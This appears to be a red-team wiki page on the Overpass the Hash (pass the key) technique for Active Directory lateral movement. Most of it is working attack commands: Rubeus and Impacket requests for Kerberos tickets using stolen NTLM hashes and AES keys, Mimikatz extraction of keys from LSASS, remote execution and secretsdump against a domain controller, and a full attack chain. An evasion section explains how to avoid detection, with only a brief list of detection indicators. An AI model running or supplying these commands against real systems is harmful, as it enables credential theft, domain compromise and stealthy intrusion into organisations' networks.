# Overpass the Hash (Pass the Key)

> **MITRE ATT&CK**: Lateral Movement > T1550.002 - Use Alternate Authentication Material
> **Platforms**: Windows, Linux (with Kerberos tooling)
> **Required Privileges**: User-level (with NTLM hash or AES key)
> **OPSEC Risk**: Low-Medium

## Strategic Overview

Overpass the Hash bridges Pass the Hash and Pass the Ticket by using a captured NTLM hash or AES key to request a legitimate Kerberos TGT from the domain controller. The result is a fully valid Kerberos ticket that enables authentication without ever sending NTLM traffic over the wire. This is the preferred technique in mature environments where NTLM authentication is monitored, restricted, or outright blocked. From a red team perspective, Overpass the Hash is the "upgrade path" -- you take a credential artifact (hash) and convert it into the authentication protocol that blends most naturally into enterprise traffic. When AES256 keys are available (extractable from LSASS alongside NTLM hashes), using them instead of RC4/NTLM hashes further reduces detection risk because AES is the default encryption in modern domains and RC4 usage is often flagged as anomalous.

### Why Overpass the Hash Over Standard PtH

1. NTLM authentication is increasingly monitored and restricted by mature SOCs
2. Kerberos is the default AD protocol -- it blends into normal traffic patterns
3. Many EDR products specifically alert on NTLM Type 3 logons from unusual sources
4. AES key usage is indistinguishable from legitimate Kerberos operations
5. The resulting TGT can be used across services without repeated NTLM authentications

## Technical Deep-Dive

### 1. Rubeus -- Request TGT with NTLM Hash (RC4)

```powershell
# Request TGT using RC4 (NTLM hash) and inject into current session
Rubeus.exe asktgt /user:administrator /domain:corp.local /rc4:e19ccf75ee54e06b06a5907af13cef42 /ptt

# Request TGT and save to file (for later injection or conversion)
Rubeus.exe asktgt /user:administrator /domain:corp.local /rc4:e19ccf75ee54e06b06a5907af13cef42 /outfile:admin_tgt.kirbi

# Request TGT into a new logon session (better OPSEC -- does not pollute current session)
Rubeus.exe asktgt /user:administrator /domain:corp.local /rc4:HASH /createnetonly:C:\Windows\System32\cmd.exe /show
```

### 2. Rubeus -- Request TGT with AES256 Key (Preferred for OPSEC)

```powershell
# AES256 is the default Kerberos encryption -- using it avoids RC4 downgrade alerts
Rubeus.exe asktgt /user:administrator /domain:corp.local /aes256:a561a175e395758550c9123c748a512b4b1a1ccb8e5610e0fb1c1e2f72855cce /ptt

# AES128 is also valid but less common
Rubeus.exe asktgt /user:administrator /domain:corp.local /aes128:2b4af2fda05a4108a2c21d52eee671ba /ptt

# Specify domain controller explicitly
Rubeus.exe asktgt /user:administrator /domain:corp.local /aes256:KEY /dc:dc01.corp.local /ptt
```

### 3. Mimikatz -- Overpass the Hash via sekurlsa::pth

```
# This spawns a new process with the NTLM hash injected
# The process will use Kerberos authentication, requesting a TGT automatically
privilege::debug
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:powershell.exe

# With AES256 key for better OPSEC
sekurlsa::pth /user:administrator /domain:corp.local /aes256:a561a175e395758550c9123c748a512b4b1a1ccb8e5610e0fb1c1e2f72855cce /run:cmd.exe

# Note: Mimikatz pth with /ntlm initially creates an NTLM-based logon token,
# but subsequent network authentication uses Kerberos (requests TGT on first access)
```

### 4. Impacket -- getTGT.py from Linux

```bash
# Request TGT with NTLM hash
getTGT.py corp.local/administrator -hashes :e19ccf75ee54e06b06a5907af13cef42 -dc-ip 192.168.1.10

# Request TGT with AES key
getTGT.py corp.local/administrator -aesKey a561a175e395758550c9123c748a512b4b1a1ccb8e5610e0fb1c1e2f72855cce -dc-ip 192.168.1.10

# Set the ccache and use with Impacket tools
export KRB5CCNAME=administrator.ccache
psexec.py corp.local/administrator@dc01.corp.local -k -no-pass
wmiexec.py corp.local/administrator@fileserver.corp.local -k -no-pass
secretsdump.py corp.local/administrator@dc01.corp.local -k -no-pass
```

### 5. Extracting AES Keys

```
# AES keys are stored alongside NTLM hashes in LSASS
mimikatz# sekurlsa::ekeys

# Output includes:
#   * Username : administrator
#   * Domain   : CORP.LOCAL
#   * Password : (null)
#   * Key List :
#     aes256_hmac: a561a175e395758550c9123c748a512b4b1a1ccb8e5610e0fb1c1e2f72855cce
#     aes128_hmac: 2b4af2fda05a4108a2c21d52eee671ba
#     rc4_hmac   : e19ccf75ee54e06b06a5907af13cef42

# Rubeus also dumps encryption keys
Rubeus.exe dump /nowrap
```

### 6. Complete Attack Chain Example

```bash
# Step 1: Extract hashes and AES keys from compromised host
mimikatz# sekurlsa::ekeys

# Step 2: Request TGT with AES256 key (best OPSEC)
Rubeus.exe asktgt /user:svc_backup /domain:corp.local /aes256:KEY /createnetonly:C:\Windows\System32\cmd.exe /show

# Step 3: In the new cmd.exe window, access target resources
dir \\fileserver.corp.local\C$
Enter-PSSession -ComputerName fileserver.corp.local

# Step 4: Verify you are using Kerberos (not NTLM)
klist  # Should show TGT and TGS tickets for accessed services
```

## Detection & Evasion

### Detection Indicators

- **Event ID 4768** (AS-REQ) -- TGT request with RC4 encryption type (0x17) when domain policy defaults to AES indicates potential Overpass-the-Hash with NTLM hash
- **Event ID 4768** with encryption type 0x12 (AES256) is nearly indistinguishable from legitimate
- Rubeus or Mimikatz process artifacts in memory
- TGT requests from hosts where the user has no interactive logon session
- Anomalous Kerberos pre-authentication patterns

### Evasion Techniques

- **Always prefer AES256 keys over NTLM/RC4 hashes** -- RC4 TGT requests trigger many detection rules because modern domains default to AES
- Use `createnetonly` to spawn a sacrificial process rather than injecting into your current session
- Time TGT requests during normal authentication windows for the target user
- Ensure the source host is one where the user would legitimately authenticate
- Avoid requesting TGTs for the same user from multiple hosts in rapid succession
- Use the `/dc:` parameter to target a specific DC rather than relying on DNS (avoids unexpected DC selection logs)

### Operational Comparison with PtH

| Aspect                     | PtH (Direct)        | Overpass the Hash      |
|----------------------------|----------------------|------------------------|
| Network protocol           | NTLM                | Kerberos               |
| DC interaction required    | No                  | Yes (AS-REQ)           |
| Detected by NTLM monitors | Yes                 | No                     |
| RC4 downgrade detection    | N/A                 | Yes (if using RC4)     |
| Credential Guard bypass    | No                  | No                     |
| Best use case              | Quick, no DC needed | Stealth in mature envs |

## Cross-References

- [[pass-the-hash]] - Direct NTLM-based lateral movement
- [[pass-the-ticket]] - Injecting already-obtained tickets
- Section 06: Credential Access - LSASS credential extraction including AES keys
- Section 10: Domain Escalation - Using Overpass-the-Hash with privileged accounts
- Section 15: OPSEC - Authentication protocol selection for stealth

## References

- https://attack.mitre.org/techniques/T1550/002/
- https://www.thehacker.recipes/ad/movement/kerberos/opth
- https://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash
- https://posts.specterops.io/hunting-for-overpass-the-hash-cf4ace53fa3
- https://github.com/GhostPack/Rubeus#asktgt
